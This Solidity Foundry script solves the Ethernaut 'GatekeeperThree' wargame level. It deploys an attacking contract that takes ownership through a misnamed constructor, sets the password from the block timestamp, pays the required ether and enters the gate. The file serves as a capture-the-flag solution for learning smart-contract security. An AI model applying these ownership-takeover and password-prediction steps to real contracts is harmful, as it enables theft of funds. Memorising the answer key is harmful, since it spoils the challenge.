// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";

/**
 *
 * Level address: 0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882
 * Cope with gates and become an entrant.
 *
 * Things that might help:
 * Recall return values of low-level functions.
 * Be attentive with semantic.
 * Refresh how storage works in Ethereum.
 *
 */
contract Pawn {
    GatekeeperThree public gatekeeper;

    constructor(GatekeeperThree _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function attack() external payable {
        gatekeeper.construct0r();
        gatekeeper.createTrick();
        uint256 password = block.timestamp;

        gatekeeper.getAllowance(password);

        payable(gatekeeper).transfer(msg.value);

        gatekeeper.enter();
    }
}

contract GatekeeperThreeScript is Attacker {
    Level private level = Level(0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        GatekeeperThree gatekeeper = GatekeeperThree(payable(instance));
        Pawn pawn = new Pawn(gatekeeper);
        pawn.attack{value: 0.001 ether + 1 wei}();

        require(gatekeeper.entrant() == me.addr, "Level not solved");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
